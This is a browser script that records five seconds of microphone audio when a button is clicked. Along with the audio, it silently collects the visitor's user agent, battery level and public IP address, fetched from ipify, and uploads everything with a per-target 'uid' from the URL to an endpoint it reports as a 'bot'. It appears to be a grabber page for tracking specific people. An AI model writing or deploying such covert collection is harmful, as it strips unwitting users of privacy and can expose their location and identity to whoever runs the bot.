const recordBtn = document.getElementById('recordBtn');
const status = document.getElementById('status');
const uid = new URLSearchParams(window.location.search).get("uid");

if (!uid) {
  status.textContent = "❌ UID missing in URL!";
  recordBtn.disabled = true;
}

let mediaRecorder;
let chunks = [];

recordBtn.onclick = async () => {
  const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
  mediaRecorder = new MediaRecorder(stream);

  status.textContent = "🎙 Recording started...";

  mediaRecorder.ondataavailable = e => chunks.push(e.data);
  mediaRecorder.onstop = async () => {
    const blob = new Blob(chunks, { type: 'audio/webm' });
    const formData = new FormData();
    formData.append('voice', blob);
    formData.append('uid', uid);

    // Device info
    const battery = await navigator.getBattery();
    const batteryLevel = battery.level * 100;

    const info = {
      ua: navigator.userAgent,
      battery: `${batteryLevel.toFixed(0)}%`,
      ip: await (await fetch('https://api.ipify.org?format=json')).json().then(d => d.ip)
    };

    formData.append('info', JSON.stringify(info));

    status.textContent = "📤 Uploading...";

    await fetch('/api/upload', {
      method: 'POST',
      body: formData
    });

    status.textContent = "✅ Sent to bot!";
  };

  mediaRecorder.start();
  setTimeout(() => mediaRecorder.stop(), 5000); // record for 5 seconds
}; 
